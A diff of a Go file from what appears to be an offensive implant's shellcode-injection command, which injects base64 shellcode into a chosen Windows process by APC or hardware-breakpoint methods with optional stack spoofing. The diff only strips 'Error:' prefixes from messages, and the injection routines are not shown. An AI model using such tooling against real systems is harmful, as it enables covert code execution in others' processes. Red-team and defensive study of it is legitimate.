@@ -71,7 +71,7 @@ type ApcInjectionParams struct {
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := requireParams[ApcInjectionParams](task)
@@ -80,7 +80,7 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	// Auto-select target if target mode is specified
@@ -98,7 +98,7 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
+		return errorResult("Invalid PID specified")
 	}
 
 	method := strings.ToLower(strings.TrimSpace(params.Method))
@@ -108,10 +108,10 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	if params.StackSpoof {
@@ -122,7 +122,7 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	switch method {
 	case "apc":
 		if params.TID <= 0 {
-			return errorResult("Error: Invalid Thread ID specified (APC method requires -tid)")
+			return errorResult("Invalid Thread ID specified (APC method requires -tid)")
 		}
 		output, err := performApcInjection(shellcode, params.PID, params.TID)
 		if err != nil {
@@ -143,7 +143,7 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 		return successResult(output)
 	default:
-		return errorf("Error: unknown method %q (expected \"apc\" or \"hwbp\")", method)
+		return errorf("unknown method %q (expected \"apc\" or \"hwbp\")", method)
 	}
 }
 
